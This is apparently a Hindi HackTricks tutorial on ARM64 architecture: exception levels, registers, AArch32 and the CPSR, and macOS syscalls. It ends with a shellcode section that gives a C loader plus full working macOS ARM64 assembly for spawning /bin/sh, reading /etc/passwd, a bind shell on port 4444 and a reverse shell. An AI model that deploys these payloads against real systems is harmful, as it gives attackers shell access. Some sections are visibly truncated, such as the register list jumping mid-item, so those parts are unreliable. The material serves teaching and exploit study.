# ARM64v8 का परिचय

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert) के साथ शून्य से नायक तक AWS हैकिंग सीखें</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप अपनी **कंपनी का विज्ञापन HackTricks में देखना चाहते हैं** या **HackTricks को PDF में डाउनलोड करना चाहते हैं**, तो [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) देखें!
* [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारे विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) का संग्रह
* 💬 [**Discord समूह**](https://discord.gg/hRep4RUj7f) में **शामिल हों** या [**टेलीग्राम समूह**](https://t.me/peass) या **Twitter** पर मुझे **फॉलो** करें 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **HackTricks** और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github रेपोज़ में PRs सबमिट करके अपनी हैकिंग ट्रिक्स साझा करें।

</details>

## **एक्सेप्शन लेवल्स - EL (ARM64v8)**

ARMv8 आर्किटेक्चर में, एक्सेक्यूशन लेवल्स, जिन्हें एक्सेप्शन लेवल्स (ELs) के रूप में जाना जाता है, एक्सेक्यूशन एनवायरनमेंट के विशेषाधिकार स्तर और क्षमताओं को परिभाषित करते हैं। चार एक्सेप्शन लेवल्स होते हैं, EL0 से EL3 तक, प्रत्येक एक अलग उद्देश्य की सेवा करता है:

1. **EL0 - यूजर मोड**:
* यह सबसे कम विशेषाधिकार प्राप्त स्तर है और नियमित एप्लिकेशन कोड को निष्पादित करने के लिए इस्तेमाल होता है।
* EL0 में चलने वाले एप्लिकेशन एक दूसरे से और सिस्टम सॉफ्टवेयर से अलग होते हैं, सुरक्षा और स्थिरता में वृद्धि करते हैं।
2. **EL1 - ऑपरेटिंग सिस्टम कर्नेल मोड**:
* अधिकांश ऑपरेटिंग सिस्टम कर्नेल इस स्तर पर चलते हैं।
* EL1 में EL0 से अधिक विशेषाधिकार होते हैं और सिस्टम संसाधनों तक पहुँच सकते हैं, लेकिन सिस्टम अखंडता सुनिश्चित करने के लिए कुछ प्रतिबंधों के साथ।
3. **EL2 - हाइपरवाइजर मोड**:
* यह स्तर वर्चुअलाइजेशन के लिए इस्तेमाल होता है। EL2 में चलने वाला हाइपरवाइजर एक ही भौतिक हार्डवेयर पर चलने वाले कई ऑपरेटिंग सिस्टम (प्रत्येक अपने EL1 में) का प्रबंधन कर सकता है।
* EL2 वर्चुअलाइज्ड एनवायरनमेंट्स के अलगाव और नियंत्रण के लिए सुविधाएँ प्रदान करता है।
4. **EL3 - सिक्योर मॉनिटर मोड**:
* यह सबसे अधिक विशेषाधिकार प्राप्त स्तर है और अक्सर सुरक्षित बूटिंग और विश्वसनीय निष्पादन एनवायरनमेंट्स के लिए इस्तेमाल होता है।
* EL3 सुरक्षित और गैर-सुरक्षित स्थितियों के बीच पहुँच का प्रबंधन और नियंत्रण कर सकता है (जैसे कि सुरक्षित बूट, विश्वसनीय OS, आदि)।

इन स्तरों का उपयोग यूजर एप्लिकेशन से लेकर सबसे अधिक विशेषाधिकार प्राप्त सिस्टम सॉफ्टवेयर तक सिस्टम के विभिन्न पहलुओं को प्रबंधित करने के लिए एक संरचित और सुरक्षित तरीका प्रदान करता है। ARMv8 का विशेषाधिकार स्तरों के प्रति दृष्टिकोण सिस्टम के विभिन्न घटकों को प्रभावी रूप से अलग करने में मदद करता है, जिससे सिस्टम की सुरक्षा और मजबूती में वृद्धि होती है।

## **रजिस्टर्स (ARM64v8)**

ARM64 में **31 सामान्य-उद्देश्य रजिस्टर्स** होते हैं, जिन्हें `x0` से `x30` तक लेबल किया जाता है। प्रत्येक **64-बिट** (8-बाइट) मान संग्रहीत कर सकता है। केवल 32-बिट मानों की आवश्यकता वाले ऑपरेशनों के लिए, वही रजिस्टर्स 32-बिट मोड में w0 से w30 के नामों का उपयोग करके पहुँचे जा सकते हैं।

1. **`x0`** से **`x7`** - ये आमतौर पर स्क्रैच रजिस्टर्स के रूप में इस्तेमाल होते हैं और उप-प्रक्रियाओं को पैरामीटर पास करने के लिए।
* **`x0`** एक फंक्शन के रिटर्न डेटा को भी ले जाता है
2. **`x8`** - लिनक्स कर्नेल में, `x8` का उपयोग `svc` निर्देश के लिए सिस्टम कॉल नंबर के रूप में होता है। **macOS में x16 का उपयोग होता है!**
3. **`x9`** से **`x15`** - और अधिक अस्थायी रजिस्टर्स, अक्सर स्थानीय चरों के लिए इस्तेमाल होते हैं।
4. **`x16`** और **`x17`** - **इंट्रा-प्रोसीजरल कॉल रजिस्टर्स**। तात्कालिक मानों के लिए अस्थायी रजिस्टर्स। इनका उपयोग अप्रत्यक्ष फंक्शन कॉल्स और PLT (प्रोसीजर लिंकेज टेबल) स्टब्स के लिए भी होता है।
* **`x16`** का उपयोग **`svc`** निर्देश के लिए **सिस्टम कॉल नंबर** के रूप में **macOS** में होता है।
5. **`x18`** - **प्लेटफॉर्म रजिस्टर**। इसका उपयोग एक सामान्य-उद्देश्य रजिस्टर के रूप में किया जा सकता है, लेकिन कुछ प्लेटफॉर्मों पर इस रजिस्टर का उपयोग प्लेटफॉर्म-विशिष्ट उपयोगों के लिए आरक्षित होता है: विंडोज में वर्तमान थ्रेड एनवायरनमेंट ब्लॉक के लिए पॉइंटर, या लिनक्स कर्नेल में वर्तमान **निष्पादित कार्य संरचना** के लिए पॉइंटर।
6. **`x19`** से **`x28`** - ये कॉली-सेव्ड रजिस्टर्स हैं। एक फंक्शन को अपने कॉलर के लिए इन रजिस्टर्स के मानों को संरक्षित करना चाहिए, इसलिए उन्हें स्टैक में संग्रहीत किया जाता है और कॉलर के पास वापस जाने से पहले पुनः प्राप्त किया जाता है।
7. **`x29`** - **फ्रेम पॉइंटर** स्टैक फ्रेम को ट्रैक करने के लिए। जब एक नया स्टैक फ्रेम एक फंक्शन को कॉल करने के कारण बनाया जाता है, तो **`x29`** रजिस्टर **स्टैक में संग्रहीत किया जाता है** और **नया** फ्रेम पॉइंटर पता (**`sp`** पता) इस रजिस्ट्री में **संग्रहीत किया जाता है**।
* यह रजिस्टर **सामान्य-उद्देश्य रजिस्ट्री** के रूप में भी इस्तेमाल किया जा सकता है हालांकि यह आमतौर पर **स्थानीय चरों** के संदर्भ के रूप में इस्तेमाल होता है।
8. **`x30`** या
```armasm
ldp x29, x30, [sp], #16  ; load pair x29 and x30 from the stack and increment the stack pointer
```
{% endcode %}

3. **Return**: `ret` (कॉलर को नियंत्रण वापस करता है, लिंक रजिस्टर में पते का उपयोग करके)

## AARCH32 निष्पादन स्थिति

Armv8-A 32-बिट प्रोग्रामों के निष्पादन का समर्थन करता है। **AArch32** **दो निर्देश सेटों** में से एक में चल सकता है: **`A32`** और **`T32`** और **`इंटरवर्किंग`** के माध्यम से उनके बीच स्विच कर सकता है।\
**विशेषाधिकार प्राप्त** 64-बिट प्रोग्राम 32-बिट प्रोग्रामों के **निष्पादन को अनुसूचित** कर सकते हैं, निम्न विशेषाधिकार प्राप्त 32-बिट के लिए एक अपवाद स्तर स्थानांतरण को निष्पादित करके।\
ध्यान दें कि 64-बिट से 32-बिट में संक्रमण अपवाद स्तर के निचले होने के साथ होता है (उदाहरण के लिए EL1 में 64-बिट प्रोग्राम द्वारा EL0 में एक प्रोग्राम को ट्रिगर करना)। यह **`SPSR_ELx`** विशेष रजिस्टर के **बिट 4 को 1 पर सेट करके** किया जाता है जब `AArch32` प्रोसेस थ्रेड निष्पादित होने के लिए तैयार होता है और `SPSR_ELx` के शेष भाग में **`AArch32`** प्रोग्रामों का CPSR संग्रहीत होता है। फिर, विशेषाधिकार प्राप्त प्रक्रिया **`ERET`** निर्देश को कॉल करती है ताकि प्रोसेसर **`AArch32`** में संक्रमण करे, CPSR के आधार पर A32 या T32 में प्रवेश करे।

**`इंटरवर्किंग`** CPSR के J और T बिट्स का उपयोग करके होती है। `J=0` और `T=0` का मतलब **`A32`** है और `J=0` और `T=1` का मतलब **T32** है। यह मूल रूप से निर्देश सेट T32 होने का संकेत देने के लिए **निम्नतम बिट को 1 पर सेट करने** पर आधारित है।\
यह **इंटरवर्किंग शाखा निर्देशों** के दौरान सेट किया जाता है, लेकिन जब PC को गंतव्य रजिस्टर के रूप में सेट किया जाता है तो अन्य निर्देशों के साथ सीधे सेट भी किया जा सकता है। उदाहरण:

एक और उदाहरण:
```armasm
_start:
.code 32                ; Begin using A32
add r4, pc, #1      ; Here PC is already pointing to "mov r0, #0"
bx r4               ; Swap to T32 mode: Jump to "mov r0, #0" + 1 (so T32)

.code 16:
mov r0, #0
mov r0, #8
```
### रजिस्टर्स

16 32-बिट रजिस्टर्स (r0-r15) हैं। **r0 से r14 तक** वे **किसी भी ऑपरेशन** के लिए इस्तेमाल किए जा सकते हैं, हालांकि कुछ आमतौर पर आरक्षित रहते हैं:

* **`r15`**: प्रोग्राम काउंटर (हमेशा)। अगले निर्देश का पता रखता है। A32 में वर्तमान + 8, T32 में, वर्तमान + 4।
* **`r11`**: फ्रेम पॉइंटर
* **`r12`**: इंट्रा-प्रोसीजरल कॉल रजिस्टर
* **`r13`**: स्टैक पॉइंटर
* **`r14`**: लिंक रजिस्टर

इसके अलावा, रजिस्टर्स **`बैंक्ड रजिस्ट्रीज`** में बैक अप होते हैं। जो रजिस्टर्स के मूल्यों को संग्रहित करते हैं जिससे अपवाद संभालने और विशेषाधिकार ऑपरेशनों में **तेजी से कॉन्टेक्स्ट स्विचिंग** करने की अनुमति मिलती है ताकि हर बार मैन्युअली रजिस्टर्स को सेव और रिस्टोर करने की जरूरत न पड़े।\
यह **प्रोसेसर की स्थिति को `CPSR` से प्रोसेसर मोड के `SPSR` में सेव करके** किया जाता है जिसमें अपवाद लिया जाता है। अपवाद वापसी पर, **`CPSR`** **`SPSR`** से बहाल किया जाता है।

### CPSR - वर्तमान प्रोग्राम स्थिति रजिस्टर

AArch32 में CPSR AArch64 में **`PSTATE`** के समान काम करता है और जब अपवाद लिया जाता है तो **`SPSR_ELx`** में भी संग्रहित होता है ताकि बाद में निष्पादन बहाल किया जा सके:

<figure><img src="../../../.gitbook/assets/image (725).png" alt=""><figcaption></figcaption></figure>

फील्ड्स कुछ समूहों में विभाजित होते हैं:

* एप्लिकेशन प्रोग्राम स्थिति रजिस्टर (APSR): अंकगणितीय ध्वज और EL0 से सुलभ
* निष्पादन स्थिति रजिस्टर्स: प्रक्रिया व्यवहार (OS द्वारा प्रबंधित)।

#### एप्लिकेशन प्रोग्राम स्थिति रजिस्टर (APSR)

* **`N`**, **`Z`**, **`C`**, **`V`** ध्वज (AArch64 में जैसे)
* **`Q`** ध्वज: जब भी **पूर्णांक संतृप्ति होती है** विशेष संतृप्ति अंकगणितीय निर्देश के निष्पादन के दौरान, इसे 1 पर सेट किया जाता है। एक बार जब इसे **`1`** पर सेट किया जाता है, तो यह मूल्य को तब तक बनाए रखेगा जब तक कि इसे मैन्युअली 0 पर सेट नहीं किया जाता। इसके अलावा, कोई भी निर्देश इसके मूल्य की जांच स्वतः नहीं करता है, इसे मैन्युअली पढ़कर किया जाना चाहिए।
*   **`GE`** (बड़ा या बराबर) ध्वज: यह SIMD (सिंगल इंस्ट्रक्शन, मल्टीपल डेटा) ऑपरेशनों में इस्तेमाल होता है, जैसे "समानांतर जोड़" और "समानांतर घटाव"। ये ऑपरेशन एकल निर्देश में कई डेटा बिंदुओं को संसाधित करने की अनुमति देते हैं।

उदाहरण के लिए, **`UADD8`** निर्देश **चार जोड़े बाइट्स** (दो 32-बिट ऑपरेंड्स से) को समानांतर में जोड़ता है और परिणामों को 32-बिट रजिस्टर में संग्रहित करता है। फिर यह **`GE` ध्वज को `APSR` में सेट करता है** इन परिणामों के आधार पर। प्रत्येक GE ध्वज एक बाइट जोड़ के लिए मेल खाता है, यह दर्शाता है कि उस बाइट जोड़ी के लिए जोड़ **ओवरफ्लो** हुआ।

**`SEL`** निर्देश इन GE ध्वजों का उपयोग करके शर्ताधीन क्रियाएं करता है।

#### निष्पादन स्थिति रजिस्टर्स

* **`J`** और **`T`** बिट्स: **`J`** को 0 होना चाहिए और अगर **`T`** 0 है तो A32 निर्देश सेट का उपयोग किया जाता है, और अगर यह 1 है, तो T32 का उपयोग किया जाता है।
* **IT ब्लॉक स्थिति रजिस्टर** (`ITSTATE`): ये 10-15 और 25-26 के बिट्स हैं। वे एक **`IT`** प्रीफिक्स समूह के अंदर निर्देशों के लिए शर्तों को संग्रहित करते हैं।
* **`E`** बिट: **एंडियननेस** को दर्शाता है।&#x20;
* **मोड और अपवाद मास्क बिट्स** (0-4): वे वर्तमान निष्पादन स्थिति को निर्धारित करते हैं। **पांचवां** यह दर्शाता है कि कार्यक्रम 32बिट (1 पर) या 64बिट (0 पर) के रूप में चलता है। अन्य 4 वर्तमान में इस्तेमाल किए जा रहे **अपवाद मोड** को दर्शाते हैं (जब एक अपवाद होता है और इसे संभाला जा रहा है)। सेट किया गया नंबर **वर्तमान प्राथमिकता को दर्शाता है** अगर इसे संभालते समय एक और अपवाद ट्रिगर किया जाता है।

<figure><img src="../../../.gitbook/assets/image (728).png" alt=""><figcaption></figcaption></figure>

* **`AIF`**: कुछ अपवादों को बिट्स **`A`**, `I`, `F` का उपयोग करके अक्षम किया जा सकता है। अगर **`A`** 1 है तो इसका मतलब है **असमकालिक निरस्तीकरण** ट्रिगर किए जाएंगे। **`I`** बाहरी हार्डवेयर **इंटरप्ट अनुरोधों** (IRQs) का जवाब देने के लिए कॉन्फ़िगर किया गया है। और F **तेज़ इंटरप्ट अनुरोधों** (FIRs) से संबंधित है।

## macOS

### BSD syscalls

[**syscalls.master**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master) की जांच करें। BSD syscalls में **x16 > 0** होगा।

### Mach Traps

[**syscall_sw.c**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/kern/syscall_sw.c.auto.html) की जांच करें। Mach traps में **x16 < 0** होगा, इसलिए आपको पिछली सूची से नंबरों को **माइनस के साथ** कॉल करने की जरूरत है: **`_kernelrpc_mach_vm_allocate_trap`** **`-10`** है।

आप **`libsystem_kernel.dylib`** को एक डिसासेंबलर में भी जांच सकते हैं ताकि ये (और BSD) syscalls कैसे कॉल करें, यह पता लगा सकें:
```bash
# macOS
dyldex -e libsystem_kernel.dylib /System/Volumes/Preboot/Cryptexes/OS/System/Library/dyld/dyld_shared_cache_arm64e

# iOS
dyldex -e libsystem_kernel.dylib /System/Library/Caches/com.apple.dyld/dyld_shared_cache_arm64
```
{% hint style="success" %}
कभी-कभी **`libsystem_kernel.dylib`** से **डीकंपाइल** किया गया कोड देखना **सोर्स कोड** की जांच करने से आसान होता है क्योंकि कई सिस्कॉल्स (BSD और Mach) के कोड स्क्रिप्ट्स के माध्यम से जनरेट किए जाते हैं (सोर्स कोड में टिप्पणियों की जांच करें) जबकि dylib में आप देख सकते हैं कि क्या कॉल किया जा रहा है।
{% endhint %}

### शेलकोड्स

कंपाइल करने के लिए:
```bash
as -o shell.o shell.s
ld -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib

# You could also use this
ld -o shell shell.o -syslibroot $(xcrun -sdk macosx --show-sdk-path) -lSystem
```
बाइट्स निकालने के लिए:
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/extract.sh
for c in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n '\\x'$c
done
```
<details>

<summary>C कोड जिसे शेलकोड का परीक्षण करने के लिए उपयोग किया जाता है</summary>
```c
// code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/loader.c
// gcc loader.c -o loader
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>

int (*sc)();

char shellcode[] = "<INSERT SHELLCODE HERE>";

int main(int argc, char **argv) {
printf("[>] Shellcode Length: %zd Bytes\n", strlen(shellcode));

void *ptr = mmap(0, 0x1000, PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE | MAP_JIT, -1, 0);

if (ptr == MAP_FAILED) {
perror("mmap");
exit(-1);
}
printf("[+] SUCCESS: mmap\n");
printf("    |-> Return = %p\n", ptr);

void *dst = memcpy(ptr, shellcode, sizeof(shellcode));
printf("[+] SUCCESS: memcpy\n");
printf("    |-> Return = %p\n", dst);

int status = mprotect(ptr, 0x1000, PROT_EXEC | PROT_READ);

if (status == -1) {
perror("mprotect");
exit(-1);
}
printf("[+] SUCCESS: mprotect\n");
printf("    |-> Return = %d\n", status);

printf("[>] Trying to execute shellcode...\n");

sc = ptr;
sc();

return 0;
}
```
<details>

#### Shell

[**यहाँ**](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/shell.s) से लिया गया और समझाया गया।

{% tabs %}
{% tab title="with adr" %}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
adr  x0, sh_path  ; This is the address of "/bin/sh".
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

sh_path: .asciz "/bin/sh"
```
{% endtab %}

{% tab title="स्टैक के साथ" %}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
; We are going to build the string "/bin/sh" and place it on the stack.

mov  x1, #0x622F  ; Move the lower half of "/bi" into x1. 0x62 = 'b', 0x2F = '/'.
movk x1, #0x6E69, lsl #16 ; Move the next half of "/bin" into x1, shifted left by 16. 0x6E = 'n', 0x69 = 'i'.
movk x1, #0x732F, lsl #32 ; Move the first half of "/sh" into x1, shifted left by 32. 0x73 = 's', 0x2F = '/'.
movk x1, #0x68, lsl #48   ; Move the last part of "/sh" into x1, shifted left by 48. 0x68 = 'h'.

str  x1, [sp, #-8] ; Store the value of x1 (the "/bin/sh" string) at the location `sp - 8`.

; Prepare arguments for the execve syscall.

mov  x1, #8       ; Set x1 to 8.
sub  x0, sp, x1   ; Subtract x1 (8) from the stack pointer (sp) and store the result in x0. This is the address of "/bin/sh" string on the stack.
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.

; Make the syscall.

mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

```
{% endtab %}
{% endtabs %}

#### cat के साथ पढ़ें

लक्ष्य `execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)` को निष्पादित करना है, इसलिए दूसरा तर्क (x1) पैरामीटर्स का एक सरणी है (जो मेमोरी में इसका मतलब पतों का एक ढेर है)।
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the execve syscall
sub sp, sp, #48        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, cat_path
str x0, [x1]           ; Store the address of "/bin/cat" as the first argument
adr x0, passwd_path    ; Get the address of "/etc/passwd"
str x0, [x1, #8]       ; Store the address of "/etc/passwd" as the second argument
str xzr, [x1, #16]     ; Store NULL as the third argument (end of arguments)

adr x0, cat_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


cat_path: .asciz "/bin/cat"
.align 2
passwd_path: .asciz "/etc/passwd"
```
#### sh से कमांड को फोर्क के जरिए इन्वोक करें ताकि मुख्य प्रोसेस न मारा जाए
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the fork syscall
mov x16, #2            ; Load the syscall number for fork (2) into x8
svc 0                  ; Make the syscall
cmp x1, #0             ; In macOS, if x1 == 0, it's parent process, https://opensource.apple.com/source/xnu/xnu-7195.81.3/libsyscall/custom/__fork.s.auto.html
beq _loop              ; If not child process, loop

; Prepare the arguments for the execve syscall

sub sp, sp, #64        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, sh_path
str x0, [x1]           ; Store the address of "/bin/sh" as the first argument
adr x0, sh_c_option    ; Get the address of "-c"
str x0, [x1, #8]       ; Store the address of "-c" as the second argument
adr x0, touch_command  ; Get the address of "touch /tmp/lalala"
str x0, [x1, #16]      ; Store the address of "touch /tmp/lalala" as the third argument
str xzr, [x1, #24]     ; Store NULL as the fourth argument (end of arguments)

adr x0, sh_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


_exit:
mov x16, #1            ; Load the syscall number for exit (1) into x8
mov x0, #0             ; Set exit status code to 0
svc 0                  ; Make the syscall

_loop: b _loop

sh_path: .asciz "/bin/sh"
.align 2
sh_c_option: .asciz "-c"
.align 2
touch_command: .asciz "touch /tmp/lalala"
```
#### बाइंड शेल

[https://raw.githubusercontent.com/daem0nc0re/macOS\_ARM64\_Shellcode/master/bindshell.s](https://raw.githubusercontent.com/daem0nc0re/macOS\_ARM64\_Shellcode/master/bindshell.s) से बाइंड शेल **पोर्ट 4444** में
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_bind:
/*
* bind(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 0.0.0.0 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #104
svc  #0x1337

call_listen:
// listen(s, 2)
mvn  x0, x3
lsr  x1, x2, #3
mov  x16, #106
svc  #0x1337

call_accept:
// c = accept(s, 0, 0)
mvn  x0, x3
mov  x1, xzr
mov  x2, xzr
mov  x16, #30
svc  #0x1337

mvn  x3, x0
lsr  x2, x16, #4
lsl  x2, x2, #2

call_dup:
// dup(c, 2) -> dup(c, 1) -> dup(c, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
#### रिवर्स शेल

[https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/reverseshell.s](https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/reverseshell.s) से, **127.0.0.1:4444** पर revshell
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_connect:
/*
* connect(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 127.0.0.1 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
movk x1, #0x007F, lsl #32
movk x1, #0x0100, lsl #48
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #98
svc  #0x1337

lsr  x2, x2, #2

call_dup:
// dup(s, 2) -> dup(s, 1) -> dup(s, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
<details>

<summary><strong>शून्य से नायक तक AWS हैकिंग सीखें</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> के साथ!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप चाहते हैं कि आपकी **कंपनी का विज्ञापन HackTricks में दिखाई दे** या **HackTricks को PDF में डाउनलोड करें**, तो [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) देखें!
* [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह
* 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) में **शामिल हों** या [**telegram group**](https://t.me/peass) में या **Twitter** 🐦 पर मुझे **फॉलो** करें [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos में PRs सबमिट करके अपनी हैकिंग ट्रिक्स शेयर करें।

</details>
